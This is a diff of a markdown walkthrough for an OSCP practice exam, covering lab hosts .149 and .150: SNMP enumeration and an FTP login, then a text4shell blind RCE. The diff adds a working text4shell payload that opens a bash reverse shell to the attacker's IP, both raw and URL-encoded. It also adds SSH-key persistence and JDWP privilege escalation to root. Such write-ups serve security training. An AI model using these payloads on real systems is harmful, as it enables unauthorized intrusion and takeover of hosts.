@@ -1,14 +1,18 @@
 # OSCP-B Walkthrough
 
 ## ActiveDirectory
+* <a href="#intial">Initial Escalation</a>
 
-## Standalone
 
-<a id="#150">.150</a>
+## Standalone Machines
+* <a href="#149">.149</a>
+* <a href="#150">.150</a>
+* <a href="#151">.151</a>
 
-## .150(#150)
 
-<div id=150></div>
+<div id=149></div>
+
+## .149
 
 My friends have seen my OSCP-A walkthrough and told me I'm wasting time running my nmap scans on the OSCP. I've been in this industry for years and I'm being told not to use nmap. What is the world coming to?
 
@@ -16,9 +20,59 @@ Apparently it's come to <a href="https://github.com/Tib3rius/AutoRecon">autoreco
 
 Rumour has that autorecon is built for the OSCP and that it makes life 100x easier. So autorecon it is.
 
-```sudo autorecon 192.168.166.150```
+```sudo autorecon 192.168.166.149```
 
-<b>Note:</b> It's really important to run autorecon as root, otherwise it wont check UDP (<i>foreshadowing</i>)
+<b>Note:</b> It's really important to run autorecon as root, otherwise it wont check UDP (<i>before my friends told me about autorecon I was not running UDP nmaps and wasted hours</i>)
+
+<img src="images/149-autorecon.png" style="border: 2px solid white"><br>
+
+Now would you look at that UDP 161, SNMP!
+
+I'll save you the time, there's nothing exciting with 21, 22 or 80 - trust me.
+
+So let's hack SNMP. I'm following <a href="https://hacktricks.boitatech.com.br/pentesting/pentesting-snmp">a guide from HackTricks</a> because thinking for yourself is wildly overrated.
+
+Specifically this section on enumeration:
+
+<img src="images/149-hacktricks.png" style="border: 2px solid white"><br>
+
+Let's try it out, install the packages first:
+
+```apt-get install snmp-mibs-downloader```
+
+```download-mibs```
+
+```snmpwalk -v 1 -c public 192.168.166.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull```
+
+<img src="images/149-snmpwalk.png" style="border: 2px solid white"><br>
+
+Cool! `kiero` has a weak password. That's likely to be for the SSH or the FTP.
+
+Now after trying to brute the password for `kiero` using `rockyou.txt` on SSH for like 20 minutes, then trying the same on FTP, I realised the password had to either be <i>really simple</i> or I was barking up the wrong tree. And then after trying seclists common passwords, I tried `kiero` as the password for ssh.
+
+Where I went wrong? I only tried it on SSH.
+
+So after giving up and looking for help on the OffSec discord, I found that `kiero` is an FTP user, not an SSH one.
+
+```ftp kiero@192.168.166.149```
+
+Password: `kiero`
+
+<img src="images/149-ftp.png" style="border: 2px solid white"><br>
+
+Once again, I'm grumpy. That's like the 20th time I've been <i>this</i> close and had to look up the final step only for it to be some bullshit.
+
+
+
+
+<br><br>
+<div id=150></div>
+
+## .150
+
+You know the deal, autorecon.
+
+```sudo autorecon 192.168.166.150```
 
 <img src="images/autorecon.png" style="border: 2px solid white"><br>
 
@@ -69,8 +123,84 @@ Running it, we get something like this:
 
 So text4shell abuses the way these specific libraries parse strings and allows for this code exec using Java's .getRuntime.exec(). I didn't get any results from the `whoami`, so maybe we won't get any output at all?
 
-As this is a walkthrough and not a "how I bashed my head against my keyboard really hard until it worked", I'll explain what happened.
+As this is a walkthrough and not a "how I bashed my head against my keyboard really hard", I'll explain what happened.
 
 This is a blind RCE, so we don't get any feedback from the API, but our commands <i>are being executed</i>. That is, if they're encoded. 
 
-After some troubleshooting, I found that many POCs for text4shell always URL encode all of the characters.
+After some troubleshooting, I found that many POCs for text4shell always URL encode the payload characters and that the parameters for the command are parsed in as an array.
+
+However, I still couldn't get anything to work. After giving up and searching the OffSec discord, I found that the only method that seemed to work was putting the command and args into an array. Such as:
+
+```${script:js:java.lang.Runtime.getRuntime().exec(['bash','-c','exec bash -i >& /dev/tcp/192.168.45.164/4444 0>&1'])}```
+
+Which after URL encoding is sent as a GET request:
+
+```GET /search?query=%24%7Bscript%3Ajs%3Ajava%2Elang%2ERuntime%2EgetRuntime%28%29%2Eexec%28%5B%27bash%27%2C%27%2Dc%27%2C%27exec%20bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E45%2E164%2F4444%200%3E%261%27%5D%29%7D```
+
+And with a listener on 4444, we caught it:
+
+<img src="images/150-8080-shell.png" style="border: 2px solid white"><br>
+
+Now I'm going to be honest that's just some real bullshit. Some real "it's OSCP so the exploit has to be <i>different</i>" type beat. But whatever... we've got a shell now.
+
+Let's try throwing our ssh key into the logged in `dev` users ssh config.
+
+```mkdir /home/dev/.ssh```
+
+```echo "(PUBLICKEY)" >> /home/dev/.ssh/authorized_keys```
+
+And then from there we can ssh straight in:
+
+```ssh dev@192.168.166.149```
+
+<img src="images/150-22-elevated.png" style="border: 2px solid white"><br>
+
+We'll grab the cheeky local.txt file and look for a privilege escalation.
+
+Now that we're in I'm going to launch <a href="https://github.com/peass-ng/PEASS-ng">linPEAS</a>.
+
+This is going to be noisy, but we'll look for quick wins. The legend for linPEAS is as follows:
+
+<img src="images/150-22-linpeas.png" style="border: 2px solid white"><br>
+
+Any highlighted or interesting red results?
+
+<img src="images/150-22-jdwp.png" style="border: 2px solid white"><br>
+
+Interestingly there's a jdwp service running as root on port 8000. Port 8000 wasn't open but nevertheless - taking a quick google:
+
+<img src="images/google-jdwp.png" style="border: 2px solid white"><br>
+
+Let's throw that on the back burner while we finish looking through the results. As per the above, there does appear to be a listener on the localhost for port 8000. 
+
+<img src="images/150-8000.png" style="border: 2px solid white"><br>
+
+And there's something else... the root user can login via ssh:
+
+<img src="images/150-rootpermitted.png" style="border: 2px solid white"><br>
+
+Alrigghtttttttyyyy, let's take inventory.
+
+* We're logged in as `dev`.
+* We have a service apparently vulnerable to `rce` listening internally on `port 8000`.
+* The `root` user is permitted to ssh.
+
+Let's try that RCE. There's a POC on Github called <a href="https://github.com/hugsy/jdwp-shellifier">jdwp-shellifier</a>
+
+I used wget to get the script on the .150 machine as Python is already installed. Ideally, knowing root can ssh in, instead of looking for anything fancy, we'll just copy and paste our ssh key into the root users directory:
+
+<img src="images/150-jdwp-onbox-1.png" style="border: 2px solid white"><br>
+
+We can see the last line there, we can see we need to trigger a ServerSocket using the command given. This can be done by creating another shell as dev and running that command, replacing `ip` with `localhost`
+
+<img src="images/150-devnc.png" style="border: 2px solid white"><br>
+
+And ta-da!
+
+<img src="images/150-jdwp-onbox-2.png" style="border: 2px solid white"><br>
+
+Assuming all went well, we should now be able to simply ssh in as `root`.
+
+<img src="images/150-root.png" style="border: 2px solid white"><br>
+
+Well done! Enjoy your 20 points.
